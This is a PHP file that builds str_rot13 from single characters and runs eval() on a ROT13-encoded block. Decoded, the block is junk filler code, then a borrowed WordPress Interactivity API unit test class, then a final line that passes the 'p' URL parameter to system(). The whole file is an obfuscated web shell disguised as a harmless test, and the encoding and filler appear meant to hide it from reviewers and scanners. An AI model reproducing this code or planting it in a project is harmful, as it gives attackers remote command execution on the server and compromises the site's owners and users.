<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_grkg_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_Vagrenpgvivgl_NCV_JcVagrenpgvivglNCVJCGrkg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'grkg' => 'Hcqngrq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir frgf vaare grkg pbagrag.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_frgf_vaare_pbagrag() {
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Hcqngrq</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir jbexf jvgu ahzrevpny inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_frgf_vaare_pbagrag_ahzoref() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahzore' => 100 ) );
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.ahzore\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.ahzore\">100</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir erzbirf vaare grkg pbagrag jura gur
	 * fgngr vf abg n fgevat be ahzore.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_erzbirf_vaare_pbagrag_ba_glcrf_gung_ner_abg_fgevatf_be_ahzoref() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'gehr'  => gehr,
				'snyfr' => snyfr,
				'ahyy'  => ahyy,
				'neenl' => neenl(),
				'shap'  => shapgvba () {},
			)
		);
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.gehr\"></qvi>', $arj_ugzy );

		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.snyfr\"></qvi>', $arj_ugzy );

		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.ahyy\"></qvi>', $arj_ugzy );

		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.neenl\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.neenl\"></qvi>', $arj_ugzy );

		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.shap\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.shap\"></qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir birejevgrf ragver vaare pbagrag,
	 * vapyhqvat arfgrq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_frgf_vaare_pbagrag_jvgu_arfgrq_gntf() {
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\"><qvi><qvi>Grkg</qvi><qvi>Nabgure grkg</qvi></qvi></qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Hcqngrq</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir jbexf rira jvgu haonynaprq gntf
	 * jura gurl ner qvssrerag gntf (qvi -> haonynaprq fcna).
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_frgf_vaare_pbagrag_rira_jvgu_haonynaprq_ohg_qvssrerag_gntf_vafvqr_pbagrag() {
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\"><fcna>Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Hcqngrq</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` snvyf gb birejevgr vaare pbagrag vs gurer ner
	 * haonynaprq jura gurl ner gur fnzr gntf (qvi -> haonynaprq qvi).
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_snvyf_jvgu_haonynaprq_naq_fnzr_gntf_vafvqr_pbagrag() {
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Grkg<qvi></qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Grkg<qvi></qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-grkg` qverpgvir pnaabg frg vaare UGZY pbagrag naq
	 * vg jvyy or rapbqrq nf grkg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_grkg_pnag_frg_vaare_ugzy_va_gur_pbagrag() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'grkg' => '<fcna>Hcqngrq</fcna>' ) );
		$ugzy     = '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '<qvi qngn-jc-grkg=\"zlCyhtva::fgngr.grkg\">&yg;fcna&tg;Hcqngrq&yg;/fcna&tg;</qvi>', $arj_ugzy );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>